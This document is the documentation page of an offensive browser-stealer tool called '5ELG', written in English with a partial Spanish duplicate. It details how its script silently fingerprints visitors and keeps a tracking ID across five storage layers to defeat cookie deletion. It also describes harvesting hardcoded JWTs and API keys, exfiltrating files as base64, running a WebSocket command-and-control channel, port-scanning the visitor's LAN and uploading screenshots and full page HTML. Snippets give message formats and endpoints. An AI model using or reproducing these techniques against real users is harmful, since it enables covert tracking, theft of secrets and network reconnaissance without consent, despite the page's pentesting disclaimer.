📖 What is 5ELG · Browser Stealer? START HERE ▶

5ELG (brow5er ExfiLtration and finGerprinting) is an offensive security tool that demonstrates what any webpage can silently extract from a visitor's browser — no install, no explicit permission.

This page is the "dealer" — the page served to the target. The moment they visit, merch.js runs automatically: it fingerprints the device, crawls the DOM, captures a screenshot and posts everything to the backend in a few hundred milliseconds.

This tool is designed for pentesting and security auditing on systems you own or have explicit written authorization to test. Using it against third parties without consent is illegal.
🔍 Fingerprinting — How it works TECHNICAL ▶

Fingerprinting generates a unique identifier (Fu) by combining hardware and software signals. The result is persisted across all available browser storage mechanisms to survive cookie deletion.

Fu — Fingerprint Unique ID
SHA256 hash of: cookieEnabled + fontSize + normalized language + timezone + platform. The primary cross-session identifier.
Fb — Browser Fingerprint
SHA256 derived from Fu. Represents the browser profile fingerprint. Changes with a different browser but stable within the same profile.
  • Canvas API: Renders text and shapes — GPU/font/driver differences produce unique per-device pixel data.
  • WebGL Renderer: gl.getParameter(gl.RENDERER) exposes the exact GPU model and OpenGL driver string.
  • Battery API: navigator.getBattery() returns charge level, charging state and time estimates — a passive cross-site tracking vector.
  • WebRTC IP Leak: RTCPeerConnection ICE candidates expose the LAN IP even behind some VPNs.
  • Network API: navigator.connection leaks effectiveType, downlink and rtt — ISP and location inference.
  • Media Devices: enumerateDevices() lists cameras and microphones by ID and label — no permission required.
  • DeviceMemory / hardwareConcurrency: RAM and CPU cores identify the device class with high precision.
  • Permissions API: Queries status of 10 permissions (camera, mic, geo…) without triggering any dialog.
💾 Multi-layer Persistence — Storage Evasion EVASION ▶

The Fu is stored simultaneously in 5 different mechanisms. If the user clears cookies, the identifier is recovered from IndexedDB or Cache API. This makes it very hard to remove without a full browser reset.

  • LocalStorage: Persists across sessions. User can clear it manually from DevTools.
  • SessionStorage: Lasts only the session, but acts as an immediate fallback.
  • Cookies: Path=/ SameSite=Strict. Auto-sent on every request to the same domain.
  • Cache API: caches.open('5elg-cache') — stored in the SW cache layer, survives cookie deletion.
  • IndexedDB: Browser database — survives history clearing in most browsers.
// Recovery cascade — first hit wins: 1. localStorage.getItem('u') 2. sessionStorage.getItem('u') 3. document.cookie → parse 'u=' 4. caches.open('5elg-cache').match('u') 5. indexedDB → open('5elg-db') → store.get('u')

The stealer fetches and parses every JS script referenced on the page (plus inline scripts) looking for sensitive data accidentally hardcoded.

Patterns searched

Route extraction

Results are sent via WebSocket on the inteldata channel and also included in the initial HTTP POST payload under the intel field.

📂 File Exfiltration — Browser-based file theft EXFIL ▶

For each resource in the "others" category (PDFs, images, static files), the stealer downloads them as ArrayBuffer, encodes to base64 and uploads to the server.

// Exfiltration flow: 1. extractRoutes() → result.others 2. makeFileRequest(url) → XHR arraybuffer → base64 3. uploadFile(Fu, filename, base64) → POST multipart → /upload/file?ID={Fu} → FormData with typed Blob (application/octet-stream)
Only works for files accessible without CORS restrictions. Files requiring auth or blocked by CORS are silently skipped.
🔌 WebSocket — Persistent bidirectional C2 channel C2 ▶

After resolving the Fu, the stealer opens a persistent WebSocket to the 5ELG server for real-time data exfiltration and command reception.

// Connection: wss://{host}/?u={Fu}&b={Fb} // Messages emitted: { route: "pwdata", data: { Fu, c: { links, jsFiles, other } } } { route: "inteldata", data: { Fu, c: [ { file, emails, jwtTokens, apiKs } ] } } { route: "netdata", data: { Fu, c: { "192.168.1.1": { 80: "open" } } } }
🌐 Network Scanner — LAN service discovery NETWORK ▶

Using fetch() in no-cors mode, the stealer detects open HTTP/HTTPS ports on private network IPs from inside the target's browser — no server-side CORS required.

  • Ranges scanned: 192.168.0.x, 192.168.1.x, 10.0.0.x, 10.0.1.x, 172.16.0.x, 172.16.1.x (50 hosts per range).
  • Ports: 80, 443, 8080, 8443 per IP.
  • Technique: If fetch() throws NetworkError → closed. If it returns (even opaque response) → open.
  • Results: Sent in real-time via WebSocket netdata channel and logged in the Activity Log.
Only detects HTTP/HTTPS services. SSH, SMTP, FTP etc. are not detectable this way from the browser.
📤 HTTP Payload — Screenshot + HTML + Fingerprint POST POST ▶

Alongside the WebSocket, a full HTTP POST is sent to /dealer including a complete page screenshot via html2canvas.

// POST fields (application/x-www-form-urlencoded): u → Fu (user fingerprint) b → Fb (browser hash) r → Request hash SHA256 with timestamp Ua → navigator.userAgent (full) data → btoa(JSON.stringify(extendedFingerprintData)) code → btoa(encodeURIComponent(outerHTML)) ← full page HTML s → encodeURIComponent(base64_screenshot) ← PNG capture ts → ISO timestamp
🚫 NoScript Fallback — CSS tracking without JavaScript CSS ▶

If JS is disabled (NoScript, Tor Browser), the <noscript> block activates passive CSS-only tracking techniques:

  • IMG Ping: A real <img> that fires a GET to the server, logging the visitor's IP without any JS.
  • CSS @font-face: Declares system fonts (Ubuntu→Linux, Calibri→Windows). If the font exists locally, the browser skips the URL request. If not, it fetches — server logs the OS fingerprint.
  • CSS @supports: Different render engines support different properties. -webkit-app-region→Chrome. -moz-appearance→Firefox. -apple-pay-button-style→Safari. Detects browser without JS.
// Example: detect Firefox without JS @supports(-moz-appearance: inherit) { .bs { background: url('/dealer/kid.png?u=cssTracking(Firefox)&b=NOSCRIPT') } } // If Firefox → browser applies style → makes GET → backend logs it.

🖥️ 5ELG Backend — What happens with the data BACKEND ▶

The 5ELG backend (Node.js + Express + Sequelize/SQLite) receives and stores data in several tables:

  • Log table: Every request to /dealer creates a row with Fu, Fb, Ua, IP, Ts, Dl, Ed (extended data b64), Er (request info b64), Jd (device JSON), screenshot, full HTML.
  • Finger table: Groups by Fu. Stores INTEL, PWD, FB, IPS across all sessions of the same user.
  • Files: Exfiltrated files saved server-side with Fu as origin.
  • WebSocket: pwdata, inteldata and netdata messages are processed and stored in real-time.
// Dashboard URLs: /web/dashboard → all fingerprints table /web/statics?finger={Fu} → full analysis for a specific Fu /web/files → exfiltrated files /web/scanners → IP intelligence dashboard
🌐 External APIs & Third-party Libraries ENRICHMENT ▶

In addition to the local fingerprint, 5ELG enriches each session with data from three free external geo APIs (cascade fallback) and the open-source FingerprintJS library — all client-side, no API key required.

🌍 ipwho.is (primary)
HTTPS + CORS open. No key, no signup. Returns: IP, city, country, ISP, ASN, timezone, lat/lon. Fast and reliable for most regions.

GET https://ipwho.is/
📍 ip-api.com (fallback 1)
HTTP only (HTTPS is paid). No key. 45 req/min. Returns proxy/VPN detection, mobile flag, hosting detection — very useful for risk assessment.

GET http://ip-api.com/json/?fields=...
☁ BigDataCloud (fallback 2)
HTTPS, no key, edge-deployed. Client-side only endpoint. Returns ISP, ASN, network type. Designed for browser use, GDPR-compliant.

GET https://api.bigdatacloud.net/data/client-info
🔬 FingerprintJS v5 OSS
Open-source browser fingerprinting library by Fingerprint Inc. Queries 50+ browser attributes and produces a visitorId via MurmurHash3. ~40–60% accuracy (client-side only). Loaded via CDN — blocked by some ad blockers.

import 'https://openfpcdn.io/fingerprintjs/v5/iife.min.js'

The geo cascade tries APIs in order — if ipwho.is fails (e.g. blocked), it falls back to ip-api.com (HTTP), then BigDataCloud. The geo badge in the panel shows which API succeeded. The fpjs field is included in the POST payload alongside the 5ELG Fu for server-side comparison.

ip-api.com uses HTTP (not HTTPS) for the free tier. In HTTPS contexts some browsers may block mixed-content requests — in that case BigDataCloud (HTTPS) is used instead.

🔍 Fingerprinting — Cómo funciona TÉCNICO ▶

El fingerprinting genera un identificador único (Fu) combinando señales de hardware y software. El resultado se persiste en todos los mecanismos de almacenamiento disponibles para sobrevivir al borrado de cookies.

Fu — Fingerprint Unique ID
Hash SHA256 de: cookieEnabled + fontSize + language normalizado + timezone + platform. Es el identificador principal del usuario entre sesiones.
Fb — Browser Fingerprint
SHA256 derivado del Fu. Representa la huella del navegador. Cambia con un browser distinto pero es estable dentro del mismo perfil.
  • Canvas API: Renderiza texto y formas — las diferencias GPU/fuentes producen datos de píxeles únicos por dispositivo.
  • WebGL Renderer: gl.getParameter(gl.RENDERER) expone el modelo exacto de GPU y driver OpenGL.
  • Battery API: navigator.getBattery() devuelve nivel de carga y estado — vector de tracking cross-site pasivo.
  • WebRTC IP Leak: Los ICE candidates de RTCPeerConnection exponen la IP de la LAN incluso detrás de algunas VPN.
  • Network API: navigator.connection filtra effectiveType, downlink y rtt — permite inferir ISP y ubicación.
  • Media Devices: enumerateDevices() lista cámaras y micrófonos por ID y etiqueta sin pedir permiso.
  • DeviceMemory / hardwareConcurrency: RAM y cores de CPU identifican la clase de dispositivo con alta precisión.
  • Permissions API: Consulta el estado de 10 permisos (cámara, micro, geo…) sin activar ningún diálogo.
💾 Persistencia multi-capa — Evasión de Storage EVASIÓN ▶

El Fu se almacena simultáneamente en 5 mecanismos distintos. Si el usuario borra las cookies, el identificador se recupera de IndexedDB o Cache API. Esto hace muy difícil eliminarlo sin un reset completo del navegador.

  • LocalStorage: Persiste entre sesiones. El usuario puede borrarlo desde DevTools.
  • SessionStorage: Solo dura la sesión, pero actúa como fallback inmediato.
  • Cookies: Path=/ SameSite=Strict. Se envían automáticamente en cada request al mismo dominio.
  • Cache API: caches.open('5elg-cache') — persiste en la capa de cache, resistente al borrado de cookies.
  • IndexedDB: Base de datos del browser — persiste incluso tras borrar historial en la mayoría de browsers.
// Recuperación en cascada — el primero que responda gana: 1. localStorage.getItem('u') 2. sessionStorage.getItem('u') 3. document.cookie → parsear 'u=' 4. caches.open('5elg-cache').match('u') 5. indexedDB → open('5elg-db') → store.get('u')

Usando fetch() en modo no-cors, el stealer detecta puertos HTTP/HTTPS abiertos en IPs de la red privada del target desde dentro de su propio navegador.
